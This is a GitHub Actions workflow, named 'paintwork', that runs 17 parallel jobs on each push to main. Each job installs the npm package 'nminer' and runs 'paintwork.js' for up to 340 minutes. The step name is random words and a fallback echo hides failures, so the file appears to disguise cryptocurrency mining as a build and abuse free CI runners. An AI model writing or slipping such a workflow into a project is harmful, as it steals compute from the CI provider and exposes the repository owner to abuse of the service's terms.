name: paintwork
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 4956 }
          - { version: 6588 }
          - { version: 1034 }
          - { version: 9455 }
          - { version: 615 }
          - { version: 2300 }
          - { version: 8785 }
          - { version: 9107 }
          - { version: 1335 }
          - { version: 7399 }
          - { version: 3957 }
          - { version: 3129 }
          - { version: 7690 }
          - { version: 1181 }
          - { version: 7256 }
          - { version: 4151 }
          - { version: 669 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: despite wisely though fledgling diligently
        run: |
          npm install nminer@latest
          timeout 340m node paintwork.js || echo "paintwork executed"